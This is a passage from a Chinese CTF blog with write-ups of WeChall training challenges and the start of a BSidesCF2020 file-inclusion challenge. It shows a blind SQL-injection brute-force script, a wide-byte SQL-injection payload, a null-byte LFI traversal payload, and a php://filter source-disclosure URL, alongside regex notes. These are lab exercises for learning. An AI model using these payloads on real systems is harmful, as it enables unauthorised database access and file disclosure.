high = <span class="number">128</span></span><br><span class="line">	<span class="keyword">while</span> low &lt; high:</span><br><span class="line">		mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">		payload = payload3.<span class="built_in">format</span>(payload2, i, mid)</span><br><span class="line">		resp = requests.get(url.<span class="built_in">format</span>(payload))</span><br><span class="line">		<span class="comment"># print(j)</span></span><br><span class="line">		<span class="comment"># print(url.format(payload))</span></span><br><span class="line">		<span class="comment"># print( resp.text)</span></span><br><span class="line">		<span class="keyword">if</span> success <span class="keyword">in</span> resp.text:</span><br><span class="line">			low = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high = mid</span><br><span class="line">	<span class="keyword">if</span> low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tb_name += <span class="built_in">chr</span>(low)</span><br><span class="line">		print(tb_name)</span><br><span class="line">tb_name=<span class="string">&quot;aaawrong,usertableus4&quot;</span></span><br></pre></td></tr></table></figure>
<p>答案为（试出来的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gizmore_tableu61_usertableus4</span><br></pre></td></tr></table></figure>
<h1 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h1><p>考察：宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: 1 %Df%27 union select &#39;Admin&#39; from users#</span><br></pre></td></tr></table></figure>


<h1 id="Training-Regex-1"><a href="#Training-Regex-1" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^wechall$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>考察：%00截断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># Higlighter Plain 如果有show变量，且show变量的值是source，就显示index.php的代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] === <span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: text/plain; charset=utf8;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Change dir to web root 跳转到这个目录</span></span><br><span class="line">chdir(<span class="string">&#x27;../../../../../&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print the website header</span></span><br><span class="line">define(<span class="string">&#x27;GWF_PAGE_TITLE&#x27;</span>, <span class="string">&#x27;Local File Inclusion&#x27;</span>);</span><br><span class="line"><span class="comment"># 与require作用相同，唯一区别是若该文件代码已被包含，则不会再次包含</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_head.php&#x27;</span>);</span><br><span class="line"><span class="comment"># ？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$chall</span> = WC_Challenge::getByTitle(<span class="string">&#x27;Training: PHP LFI&#x27;</span>))) &#123;</span><br><span class="line">        <span class="variable">$chall</span> = WC_Challenge::dummyChallenge(<span class="string">&#x27;Training: PHP LFI&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;challenge/training/php/lfi/up/index.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chall</span>-&gt;showHeader();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Highlighter BBCode</span></span><br><span class="line"><span class="comment"># 从URL处判断是否是高亮显示代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>] === <span class="string">&#x27;christmas&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.file_get_contents(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">### Here is your exploit :) ###</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment"># 此处为关键语句，code为设置filename=pages/&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;$filename = \&#x27;pages/\&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#x27;.html\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$code_emulate_pnb</span> = <span class="string">&#x27;$filename = Common::substrUntil($filename, &quot;\\0&quot;);&#x27;</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></span><br><span class="line"><span class="comment"># 包含filename文件</span></span><br><span class="line"><span class="variable">$code2</span> = <span class="string">&#x27;include $filename;&#x27;</span>;</span><br><span class="line"><span class="comment">### End of exploit ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show the mission box</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;index.php?file=&#x27;</span>;</span><br><span class="line"><span class="variable">$ex</span> = <span class="keyword">array</span>(<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;forums&#x27;</span>);</span><br><span class="line"><span class="variable">$showsrc1</span> = <span class="string">&#x27;index.php?show=source&#x27;</span>;</span><br><span class="line"><span class="variable">$showsrc2</span> = <span class="string">&#x27;index.php?highlight=christmas&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ex</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$e</span>) &#123; <span class="variable">$ex</span>[<span class="variable">$i</span>] = htmlspecialchars(<span class="variable">$url</span>.<span class="variable">$e</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;info&#x27;</span>, <span class="keyword">array</span>(GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.<span class="variable">$code</span>.PHP_EOL.<span class="variable">$code2</span>.<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;../solution.php&#x27;</span>, <span class="variable">$showsrc1</span>, <span class="variable">$showsrc2</span>, <span class="variable">$ex</span>[<span class="number">0</span>], <span class="variable">$ex</span>[<span class="number">1</span>], <span class="variable">$ex</span>[<span class="number">2</span>])), <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;title&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Execute the code, using eval.</span></span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">false</span>);</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="variable">$code_emulate_pnb</span>); <span class="comment"># eval the first line</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_t&quot;&gt;&#x27;</span>.<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;example_title&#x27;</span>).<span class="string">&#x27; (&#x27;</span>.htmlspecialchars(<span class="variable">$filename</span>).<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (lfiIsSafeDir(<span class="variable">$filename</span>) === <span class="literal">true</span>) &#123; <span class="keyword">eval</span>(<span class="variable">$code2</span>); &#125; <span class="comment"># Eval the second line, when safe.</span></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> GWF_HTML::error(<span class="string">&#x27;LFI&#x27;</span>, <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;err_basedir&#x27;</span>), <span class="literal">false</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">true</span>);</span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show credits box</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> !== (<span class="variable">$minus</span> = GWF_User::getByName(<span class="string">&#x27;minus&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;credits&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$minus</span>-&gt;displayProfileLink())));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show end of website</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;copyrightFooter();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">### Safety first ###</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lfiIsSafeDir</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$valid</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pages&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/../..&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/..&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> in_array(<span class="variable">$d</span>, <span class="variable">$valid</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据代码中的关键代码段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 此处为关键语句，code为设置filename&#x3D;pages&#x2F;&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span><br><span class="line">$code &#x3D; &#39;$filename &#x3D; \&#39;pages&#x2F;\&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#39;.html\&#39;;&#39;;</span><br><span class="line">$code_emulate_pnb &#x3D; &#39;$filename &#x3D; Common::substrUntil($filename, &quot;\\0&quot;);&#39;; # Emulate Poison Null Byte for PHP&gt;&#x3D;5.3.4</span><br><span class="line"># 包含filename文件</span><br><span class="line">$code2 &#x3D; &#39;include $filename;&#39;;</span><br></pre></td></tr></table></figure>
<p>提交URL（为什么两个父节点，因为试出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;solution.php%00 </span><br><span class="line"># %00用于截断</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex-2"><a href="#Training-Regex-2" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$&#x2F;</span><br></pre></td></tr></table></figure>
<p>至于为什么用:，是因为题目提示了“你的模式会补货一个字符串，但这不是必须的。请使用非捕获组”</p>
<h2 id="正则的非获取匹配"><a href="#正则的非获取匹配" class="headerlink" title="正则的非获取匹配"></a>正则的非获取匹配</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?:pattern</span><br><span class="line">	匹配pattern但不获取匹配结果，不进行存储供使用</span><br></pre></td></tr></table></figure>
<p>参考 <a target="_blank" rel="noopener" href="http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/">http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">(&#39;7&#39;,)</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" data-id="ckkdrz0z00003ugus79z2hkub" data-title="wechall答案" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time class="dt-published" datetime="2021-01-22T06:44:29.000Z" itemprop="datePublished">2021-01-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTF-Web-文件包含</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h1><p>来源：BSidesCF2020</p>
<p>考察：php伪协议绕过</p>
<p>进入页面，有两个按钮，点击后发现URL有变化，猜测为php伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;06c5fe33-f46d-4bc0-9393-c91435db174c.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk&#x2F;PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk&#x2F;PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk&#x2F;IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw&#x2F;cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg&#x3D;&#x3D;	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>base64转码后的index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125; &lt;html&gt;</span></span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;Images that spark joy&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/material.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;page-container 